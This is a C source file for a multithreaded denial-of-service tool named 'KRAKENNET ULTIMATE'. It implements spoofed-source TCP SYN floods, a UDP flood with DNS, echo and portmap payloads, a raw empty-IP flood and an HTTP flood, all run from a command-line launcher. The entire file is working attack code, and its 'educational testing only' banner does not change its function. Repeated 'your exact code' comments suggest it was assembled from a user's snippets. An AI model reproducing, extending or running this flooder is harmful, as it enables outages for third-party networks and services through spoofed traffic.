#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <sys/select.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>

// --- Constants ---
#define MAX_THREADS 4096
#define MAX_PACKET_SIZE 65535
#define PHI 0x9e3779b9
#define MAXTTL 255

// --- Global State ---
volatile int running = 1;
volatile int limiter = 0;
volatile unsigned int pps = 0;
volatile unsigned int sleeptime = 100;
volatile unsigned int floodport = 0;
volatile long long total_success = 0;
volatile long long total_fail = 0;
volatile long long total_bytes = 0;
volatile unsigned int lenght_pkt = 0;

int attack_duration = 30;
int num_workers = 50;
char target_host[256];
int target_port = 80;
char attack_mode[50];
char sourceip[17];

// --- CMWC PRNG (Your exact implementation) ---
static unsigned long int Q[4096], c = 362436;
static unsigned int cmwc_i = 4095;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    cmwc_i = (cmwc_i + 1) & 4095;
    t = a * Q[cmwc_i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[cmwc_i] = r - x);
}

int randnum(int min_num, int max_num) {
    int result = 0, low_num = 0, hi_num = 0;
    if (min_num < max_num) {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

// --- Checksum (Your exact implementation) ---
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--) {
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// =============================================
// NFO-TCP METHOD (Your exact code)
// =============================================

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
    
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
    
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void* nfo_tcp_worker(void *arg) {
    char *td = (char *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        return NULL;
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    // Your exact IP header setup
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 24;
    iph->id = htonl(54321);
    iph->frag_off = htons(0x4000);
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
    
    // Your exact TCP header setup
    tcph->source = htons(5678);
    tcph->check = 0;
    memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00", 24);
    tcph->syn = 1;
    tcph->window = htons(64240);
    tcph->doff = ((sizeof(struct tcphdr)) + 24)/4;
    
    tcph->dest = htons(floodport);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    const int *val = &tmp;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp));
    
    init_rand(time(NULL));
    register unsigned int i = 0;
    
    // Your exact window sizes and MSS values
    int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
    int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
    
    while(running) {
        // Your exact packet construction
        tcph->check = 0;
        tcph->seq = htonl(rand());
        tcph->doff = ((sizeof(struct tcphdr)) + 24)/4;
        tcph->dest = htons(floodport);
        
        iph->ttl = randnum(100, 130);
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | 
                     (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->dest = htons(floodport);
        tcph->check = tcpcsum(iph, tcph, 24);
        
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        
        // Your exact TCP options modification
        char stronka[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
        stronka[3] = mssvalues[rand() % 9];
        stronka[7] = randnum(6, 11);
        stronka[12] = randnum(1, 250);
        stronka[13] = randnum(1, 250);
        stronka[14] = randnum(1, 250);
        stronka[15] = randnum(1, 250);
        
        tcph->window = htons(windows[rand() % 11]);
        const char *newpayload = stronka;
        memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 24);
        
        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, iph->tot_len);
    }
    
    close(s);
    return NULL;
}

// =============================================
// SYBEX METHOD (Your exact code)
// =============================================

int randommexico(int min, int max) {
   static bool first = true;
   if (first) {  
      srand(time(NULL));
      first = false;
   }
   return min + rand() % (max + 1 - min);
}

unsigned short checksum_tcp_packet(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

void* sybex_worker(void *arg) {
    char *targettr = (char *)arg;
    char datagram[4096], source_ip[32], *data, *pseudogram;
    memset(datagram, 0, 4096);
    
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
    } psh;
    
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    if (lenght_pkt == 0) {
        data = "";
    }
    
    sin.sin_family = AF_INET;
    int rdzeroport;
    
    if (floodport == 0) {
        rdzeroport = randommexico(2, 65535);
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons(rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons(floodport);
    }
    
    sin.sin_addr.s_addr = inet_addr(targettr);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        return NULL;
    }
    
    while(running) {
        char primera[20];
        int one_r = randommexico(1, 250);
        int two_r = randommexico(1, 250);
        int three_r = randommexico(1, 250);
        int four_r = randommexico(1, 250);
        snprintf(primera, sizeof(primera)-1, "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
        snprintf(sourceip, sizeof(sourceip)-1, primera);
        strcpy(source_ip, sourceip);
        
        // Your exact IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
        iph->id = htons(1);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(source_ip);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum_tcp_packet((unsigned short *)datagram, iph->tot_len);
        
        int randSeq = randommexico(10000, 99999);
        int randAckSeq = randommexico(10000, 99999);
        int randSP = randommexico(2, 65535);
        int randWin = randommexico(1000, 9999);
        
        // Your exact TCP header
        tcph->source = htons(randSP);
        tcph->seq = htonl(randSeq);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin=0;
        tcph->syn=1;
        tcph->rst=0;
        tcph->psh=0;
        tcph->ack=0;
        tcph->urg=0;
        tcph->window = htons(randWin);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        psh.source_address = inet_addr(source_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
        pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
        tcph->check = checksum_tcp_packet((unsigned short*)pseudogram, psize);
        free(pseudogram);
        
        int one = 1;
        const int *val = &one;
        setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
        
        if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, iph->tot_len);
        }
        
        usleep(1000);
    }
    
    close(s);
    return NULL;
}

// =============================================
// UDP-BYPASS METHOD (Your exact code)
// =============================================

unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
    struct udp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_UDP;
    pseudohead.length = htons(sizeof(struct udphdr));
    
    int totaludp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr);
    unsigned short *udp = malloc(totaludp_len);
    memcpy((unsigned char *)udp, &pseudohead, sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp + sizeof(struct udp_pseudo), (unsigned char *)udph, sizeof(struct udphdr));
    
    unsigned short output = csum(udp, totaludp_len);
    free(udp);
    return output;
}

void setup_ip_header_udp(struct iphdr *iph) {
    char ip[17];
    snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->id = htonl(rand()%54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(ip);
}

void vulnMix(struct iphdr *iph, struct udphdr *udph) {
    int protocol[] = { 7, 53, 111, 123, 137, 138, 161, 177, 389, 427, 500, 520, 623, 626, 1194, 1434, 1604, 1900, 5353, 8797, 9987 };
    
    switch(protocol[rand()%22]) {
        case 53: // DNS - Your exact payload
            memcpy((void *)udph + sizeof(struct udphdr), 
                   "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01", 32);
            udph->len = htons(sizeof(struct udphdr) + 32);
            udph->dest = htons(53);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 32;
            break;
            
        case 7: // Echo - Your exact payload
            memcpy((void *)udph + sizeof(struct udphdr), "\x0D\x0A\x0D\x0A", 4);
            udph->len = htons(sizeof(struct udphdr) + 4);
            udph->dest = htons(7);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
            break;
            
        case 111: // Your exact payload
            memcpy((void *)udph + sizeof(struct udphdr), 
                   "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 40);
            udph->len = htons(sizeof(struct udphdr) + 40);
            udph->dest = htons(111);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 40;
            break;
            
        // Add other protocols as needed...
        default: // Default case
            memcpy((void *)udph + sizeof(struct udphdr), 
                   "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01", 32);
            udph->len = htons(sizeof(struct udphdr) + 32);
            udph->dest = htons(53);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 32;
            break;
    }
}

void* udp_bypass_worker(void *arg) {
    char *td = (char *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(td);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0){
        return NULL;
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header_udp(iph);
    udph->source = htons(rand() % 65535 - 1026);
    vulnMix(iph, udph);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    const int *val = &tmp;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp));
    
    init_rand(time(NULL));
    register unsigned int i = 0;
    
    while(running) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | 
                     (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        udph->source = htons(rand_cmwc() & 0xFFFF);
        udph->check = 0;
        
        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, iph->tot_len);
    }
    
    close(s);
    return NULL;
}

// =============================================
// EMPTY-IP METHOD (Your exact code)
// =============================================

void* empty_ip_flood_worker(void* arg) {
    char *target = (char*)arg;
    char packet[20];
    struct iphdr *iph = (struct iphdr *)packet;
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        return NULL;
    }
    
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("1.1.1.1"); // Your exact target IP
    
    memset(packet, 0, sizeof(packet));
    
    // Your exact IP header setup
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 0;  // Your exact protocol 0
    iph->saddr = inet_addr("8.8.8.8"); // Your exact source IP
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)packet, sizeof(struct iphdr)/2);
    
    while (running) {
        sendto(s, packet, sizeof(struct iphdr), 0, (struct sockaddr *)&sin, sizeof(sin));
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr));
        usleep(1000);
    }
    
    close(s);
    return NULL;
}

// =============================================
// HTTP/HTTPS BYPASS METHODS
// =============================================

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    return size * nmemb;
}

void* http_flood_worker(void* arg) {
    char *host = (char*)arg;
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_ALL);
    
    char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };
    int ua_count = 3;
    
    while (running) {
        curl = curl_easy_init();
        if (!curl) {
            usleep(10000);
            continue;
        }

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        
        char url[512];
        char path[128];
        
        // Generate random path like your methods
        const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        int path_len = 10 + (rand_cmwc() % 40);
        path[0] = '/';
        for (int j = 1; j < path_len; j++) {
            path[j] = chars[rand_cmwc() % 62];
        }
        path[path_len] = '\0';
        
        if (target_port == 443) {
            snprintf(url, sizeof(url), "https://%s%s", host, path);
        } else {
            snprintf(url, sizeof(url), "http://%s:%d%s", host, target_port, path);
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        
        struct curl_slist *headers = NULL;
        char ua_header[256];
        snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", user_agents[rand_cmwc() % ua_count]);
        headers = curl_slist_append(headers, ua_header);
        headers = curl_slist_append(headers, "Accept: */*");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        res = curl_easy_perform(curl);
        
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        
        if (res == CURLE_OK && http_code > 0) {
            __sync_fetch_and_add(&total_success, 1);
        } else {
            __sync_fetch_and_add(&total_fail, 1);
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        usleep(50000);
    }
    
    curl_global_cleanup();
    return NULL;
}

// =============================================
// MAIN FUNCTION
// =============================================

void print_banner() {
    printf("\n");
    printf("              ...-%@@@@@@@-..               \n");
    printf("             .:%@@@@@@@@@@@@%-.             \n");
    printf("            .#@@@@@@@@@@@@@@@@#.            \n");
    printf("           .%@@@@@@@@@@@@@@@@@@%.           \n");
    printf("           :@@@@@@@@@@@@@@@@@@@@:           \n");
    printf(" ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. \n");
    printf(":@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-\n");
    printf("_____________________________________\n");
    printf("|   KRAKENNET ULTIMATE v7.0         |\n");
    printf("|    EDUCATIONAL TESTING ONLY       |\n");
    printf("|     YOUR SERVERS ONLY!!!          |\n");
    printf("-------------------------------------\n\n");
}

void print_stats() {
    printf("\rPackets/Requests: %llu | Bytes: %llu | Failed: %llu", 
           total_success, total_bytes, total_fail);
    fflush(stdout);
}

void signal_handler(int sig) {
    running = 0;
    printf("\nShutting down...\n");
}

void print_methods() {
    printf("Available Methods:\n");
    printf("  nfo-tcp       - NFO TCP flood (your exact method)\n");
    printf("  sybex         - Sybex TCP RST flood (your exact method)\n");
    printf("  udp-bypass    - UDP multi-protocol bypass (your exact method)\n");
    printf("  empty-ip      - Empty IP protocol flood (your exact method)\n");
    printf("  http-flood    - HTTP/HTTPS flood\n");
    printf("\nUsage: <target> <port> <method> <threads> <time>\n");
    printf("Example: 192.168.1.1 80 nfo-tcp 100 60\n");
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 6) {
        printf("Invalid parameters!\n");
        print_methods();
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    
    // Parse arguments
    strcpy(target_host, argv[1]);
    target_port = atoi(argv[2]);
    strcpy(attack_mode, argv[3]);
    num_workers = atoi(argv[4]);
    attack_duration = atoi(argv[5]);
    floodport = target_port;
    
    if (num_workers > MAX_THREADS) {
        num_workers = MAX_THREADS;
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
    }
    
    // Initialize random with your exact method
    init_rand(time(NULL));
    srand(time(NULL));
    
    printf("Target: %s:%d\n", target_host, target_port);
    printf("Method: %s\n", attack_mode);
    printf("Threads: %d\n", num_workers);
    printf("Duration: %d seconds\n", attack_duration);
    
    // Resolve target
    struct hostent *he = gethostbyname(target_host);
    char target_ip[INET_ADDRSTRLEN];
    if (he) {
        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
        printf("Resolved: %s -> %s\n", target_host, target_ip);
    } else {
        strcpy(target_ip, target_host);
        printf("Using target as IP: %s\n", target_ip);
    }
    
    // Select worker function
    void *(*worker_func)(void*) = NULL;
    
    if (strcmp(attack_mode, "nfo-tcp") == 0) {
        worker_func = nfo_tcp_worker;
        printf("Starting NFO-TCP flood (your exact method)...\n");
    } else if (strcmp(attack_mode, "sybex") == 0) {
        worker_func = sybex_worker;
        printf("Starting Sybex RST flood (your exact method)...\n");
    } else if (strcmp(attack_mode, "udp-bypass") == 0) {
        worker_func = udp_bypass_worker;
        printf("Starting UDP bypass (your exact method)...\n");
    } else if (strcmp(attack_mode, "empty-ip") == 0) {
        worker_func = empty_ip_flood_worker;
        printf("Starting Empty IP flood (your exact method)...\n");
    } else if (strcmp(attack_mode, "http-flood") == 0) {
        worker_func = http_flood_worker;
        printf("Starting HTTP/HTTPS flood...\n");
    } else {
        printf("Unknown method: %s\n", attack_mode);
        print_methods();
        return 1;
    }
    
    printf("Starting in 3 seconds...\n");
    sleep(3);
    
    pthread_t threads[MAX_THREADS];
    
    // Start workers
    printf("Starting %d workers...\n", num_workers);
    for (int i = 0; i < num_workers; i++) {
        if (pthread_create(&threads[i], NULL, worker_func, (void*)target_ip) != 0) {
            perror("Failed to create thread");
            running = 0;
            break;
        }
    }
    
    printf("Attack started! Press Ctrl+C to stop.\n");
    
    // Run for specified duration
    time_t start_time = time(NULL);
    while (running) {
        time_t current_time = time(NULL);
        if ((current_time - start_time) >= attack_duration) {
            running = 0;
            break;
        }
        print_stats();
        sleep(1);
    }
    
    // Wait for threads to finish
    printf("\nWaiting for threads to finish...\n");
    for (int i = 0; i < num_workers; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\nAttack complete!\n");
    printf("Total packets/requests: %llu\n", total_success);
    printf("Total bytes sent: %llu\n", total_bytes);
    if (total_fail > 0) {
        printf("Failed requests: %llu\n", total_fail);
    }
    
    return 0;
}
